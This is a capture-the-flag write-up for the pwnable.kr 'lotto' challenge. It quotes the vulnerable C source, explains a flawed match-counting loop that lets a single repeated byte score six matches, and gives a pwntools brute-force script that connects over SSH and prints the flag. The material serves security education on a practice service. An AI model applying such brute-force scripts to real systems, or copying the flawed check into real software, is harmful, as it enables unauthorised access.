# lotto

## Description

lotto - 2 pt

>Mommy! I made a lotto program for my homework. <br>
>do you want to play? <br> <br> <br>
> ssh lotto@pwnable.kr -p2222 (pw:guest)


## Solution

### Exploit

In this challenge, we are presented with a lotto program. Our goal is to win the lotto and get flag:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){
	
	int i;
	printf("Submit your 6 lotto bytes : ");
	fflush(stdout);

	int r;
	r = read(0, submit, 6);

	printf("Lotto Start!\n");
	//sleep(1);

	// generate lotto numbers
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	unsigned char lotto[6];
	if(read(fd, lotto, 6) != 6){
		printf("error2. tell admin\n");
		exit(-1);
	}
	for(i=0; i<6; i++){
		lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
	}
	close(fd);
	
	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}

}

...
```

The game is simple. We have to submit 6 bytes and the program will generate 6 random bytes in the range [1,45]. If we get 6 matches we win and get the flag!

The key observation here is we don't need to guess *all* 6 bytes. We can guess only 1 byte and get the flag. The reason is that the program compares each byte of our input with each all of the generated bytes. So if we guess 1 byte correctly, we will get 6 matches.

We can write a simple bruteforce script that guesses the same byte for all 6 bytes and checks if we get 6 matches:

```python
from pwn import *

con = ssh('lotto', 'pwnable.kr', port=2222, password='guest')

p = con.process('./lotto')

while True:
    p.recvuntil(b'3. Exit\n')
    p.sendline(b'1')
    p.recvuntil(b'Submit your 6 lotto bytes : ')
    p.sendline(b'######')
    p.recvuntil(b'Lotto Start!\n')
    
    res = p.recvline().decode()
    
    if 'bad' not in res:
        print(res)
        break
```

Running the script gives us the flag:

```
sorry mom... I FORGOT to check duplicate numbers...
```